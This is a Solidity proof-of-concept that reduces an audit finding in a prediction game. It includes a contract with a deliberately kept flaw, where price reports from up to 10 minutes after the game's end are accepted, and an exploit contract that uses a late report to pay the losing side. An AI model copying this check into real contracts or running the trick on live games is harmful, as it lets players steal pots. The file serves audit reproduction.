// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Xyro UpDown.finalizeGame — reports within 10 minutes of endTime are accepted
    (Zokyo, finding 45673).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: the freshness check is `priceTimestamp - endTime <= 10 minutes`,
    so a Chainlink report from 9 minutes after the end, whose price has crossed
    the starting price, is accepted and the other side takes the pot.
    The blamed require is preserved verbatim (@> VULN). */

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {}

contract UpDown {
    MockERC20 public token;
    uint256 public endTime;
    uint256 public startingPrice;
    address public up;
    address public down;
    bool public immutable windowed;
    uint256 public constant STAKE = 100 ether;

    constructor(MockERC20 t, bool windowed_) {
        token = t;
        windowed = windowed_;
        startingPrice = 1000;
    }

    function open(address up_, address down_) external {
        up = up_;
        down = down_;
        endTime = block.timestamp;
        token.transferFrom(msg.sender, address(this), STAKE * 2);
    }

    function priceAt(uint256 ts) public view returns (uint256) {
        if (ts == endTime) return 1100;
        return 900;
    }

    function finalizeGame(uint256 priceTimestamp) external {
        require(block.timestamp >= endTime, "Too early to finish");
        uint256 price = priceAt(priceTimestamp);
        if (windowed) {
            // @> VULN: a report up to 10 minutes after endTime is accepted
            require(
                priceTimestamp - endTime <= 10 minutes || block.timestamp - priceTimestamp <= 10 minutes,
                "Old chainlink report"
            );
        } else {
            require(priceTimestamp == endTime, "not the end report");
        }
        if (price > startingPrice) {
            token.transfer(up, STAKE * 2);
        } else {
            token.transfer(down, STAKE * 2);
        }
    }
}

contract Exploit {
    MockERC20 public token; // nonce 1
    Sink public upV; // nonce 2
    Sink public downV; // nonce 3
    UpDown public game; // nonce 4
    Sink public upC; // nonce 5
    Sink public downC; // nonce 6
    UpDown public control; // nonce 7

    uint256 public downPaid;
    uint256 public controlUpPaid;

    constructor() {
        token = new MockERC20();
        upV = new Sink();
        downV = new Sink();
        game = new UpDown(token, true);
        upC = new Sink();
        downC = new Sink();
        control = new UpDown(token, false);
        token.mint(address(this), 400 ether);
    }

    function run() external {
        game.open(address(upV), address(downV));
        uint256 moved = game.endTime() + 9 minutes;
        game.finalizeGame(moved);
        downPaid = token.balanceOf(address(downV));
        require(downPaid == 200 ether, "down was not paid the pot");
        require(token.balanceOf(address(upV)) == 0, "true winner was paid");

        control.open(address(upC), address(downC));
        control.finalizeGame(control.endTime());
        controlUpPaid = token.balanceOf(address(upC));
        require(controlUpPaid == 200 ether, "control did not pay the true winner");
        require(token.balanceOf(address(downC)) == 0, "control paid the late side");
    }
}
